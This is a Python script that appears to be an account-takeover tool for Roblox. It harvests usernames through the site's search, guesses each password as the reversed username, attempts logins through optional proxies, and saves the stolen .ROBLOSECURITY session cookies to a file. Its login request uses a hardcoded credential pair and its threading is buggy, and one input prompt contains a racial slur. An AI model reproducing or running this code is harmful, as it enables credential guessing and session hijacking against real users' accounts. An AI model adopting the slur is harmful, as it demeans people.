import random
import re
import requests
import json
import threading

f = open('namelist.json')
data = json.loads(f.read())
question = str(input("proxies yes or no: "))

if question == "yes":

    proxiees = True
    proxye = open('proxies.txt').read()
if question == "no":

    proxiees = False
threads = int(input('how many threads nigga: '))
def getrandname():
 randomname1 = random.choice(data['first'])
 randomname2 = random.choice(data['last'])
 randomname = randomname1 + randomname2
 return randomname
def getbot():
 while True:
  try:      
   randomname = getrandname()   
   resp = requests.get('https://www.roblox.com/search/users/results?maxRows=100&keyword=' + randomname)
   if resp.json()['UserSearchResults']:
       for user in resp.json()['UserSearchResults']:      
           if user['Name'] and user['Name'].lower().find(randomname):             
                 print(user['Name'] + ' password: ' + user['Name'][::-1])
                 with open ('uncheckeduserpass.txt','a') as file:
                     file.write(user['Name'] + ':' + user['Name'][::-1] + '\n')
                 threading.Thread(target=checkacc(user['Name'],user['Name'][::-1])).start()
  except:
    print('error')
      
def checkacc(name,passs):
    try:
        session = requests.Session()    
        if proxiees == True:                 
            proxyee = proxye.splitlines()
            ex = random.choice(proxyee)
            proxy = {"http": ex, "https": ex}
            session.verify = False
            session.proxies.update(proxy)
            session.trust_env=False

        xthingtokenfuck = session.post(f"https://auth.roblox.com/v2/signup").headers['x-csrf-token']
        headers = {
            'x-csrf-token': xthingtokenfuck,
             'accept': 'application/json, text/plain, */*',
             'content-type': 'application/json;charset=UTF-8'
        }
        session.headers = headers
        data = '{"ctype":"Username","cvalue":"KirkKlein16","password":"61nielKkriK"}'
        response = session.post('https://auth.roblox.com/v2/login', headers=headers, data=data)
        print(response.json())
        cookie = session.cookies['.ROBLOSECURITY']
        with open ('cookies.txt','w') as file:
            file.write(cookie + '\n')
    except:
       print('error logging in noob LOL')
    



for i in range(threads):
    x = threading.Thread(target=getbot)
    x.start()
